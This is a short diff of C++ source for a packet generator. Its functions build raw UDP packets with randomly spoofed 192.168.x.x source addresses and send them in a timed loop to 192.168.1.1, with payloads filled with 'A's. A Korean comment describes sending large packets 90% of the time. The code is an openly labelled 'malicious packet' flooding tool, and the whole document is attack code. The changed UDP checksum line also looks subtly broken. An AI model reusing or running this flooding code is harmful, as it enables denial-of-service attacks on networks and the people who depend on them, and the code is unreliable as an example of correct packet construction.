@@ -46,16 +46,18 @@ int CPacketGenerator::GenerateMaliciousPackets(std::atomic<int>& totalMaliciousP
         auto startTime = std::chrono::steady_clock::now();
         while (std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - startTime).count() < TRANSMISSION_DURATION) {
             for (int i = 0; i < PACKETS_PER_INTERVAL; i++) {
-                std::string src_ip = "192.168." + std::to_string(rand() % MAX_SEGMENT_VALUE) + "." + std::to_string(rand() % MAX_SEGMENT_VALUE);
-                int result = SendMaliciousPacket(src_ip.c_str(), "192.168.1.1", 1, logFile);
-                if (result != SUCCESS_CODE) {
-                    logFile << GetErrorMessage(result) << std::endl;
-                    return result;
-                }
-                totalMaliciousPacketsSent++;
-                {
-                    std::lock_guard<std::mutex> lock(print_mutex);
-                    std::cout << "\rTotal number of packets sent: " << totalMaliciousPacketsSent.load() << std::flush;
+                if (rand() % 10 < 9) {  // 90% 확률로 큰 패킷을 전송
+                    std::string src_ip = "192.168." + std::to_string(rand() % MAX_SEGMENT_VALUE) + "." + std::to_string(rand() % MAX_SEGMENT_VALUE);
+                    int result = SendMaliciousPacket(src_ip.c_str(), "192.168.1.1", 1, logFile);
+                    if (result != SUCCESS_CODE) {
+                        logFile << GetErrorMessage(result) << std::endl;
+                        return result;
+                    }
+                    totalMaliciousPacketsSent++;
+                    {
+                        std::lock_guard<std::mutex> lock(print_mutex);
+                        std::cout << "\rTotal number of packets sent: " << totalMaliciousPacketsSent.load() << std::flush;
+                    }
                 }
             }
             std::this_thread::sleep_for(std::chrono::milliseconds(TRANSMISSION_INTERVAL));
@@ -101,7 +103,7 @@ int CPacketGenerator::SendMaliciousPacket(const char* src_ip, const char* dst_ip
     udph->source = htons(SOURCE_PORT);
     udph->dest = htons(DESTINATION_PORT);
     udph->len = htons(sizeof(struct udphdr) + MAX_PACKET_SIZE);
-    udph->check = 0;
+    udph->check = CheckSum((void*)packet, iph->tot_len);
 
     memset(packet + sizeof(struct iphdr) + sizeof(struct udphdr), 'A', MAX_PACKET_SIZE);
     iph->check = CheckSum((unsigned short *)packet, sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE);
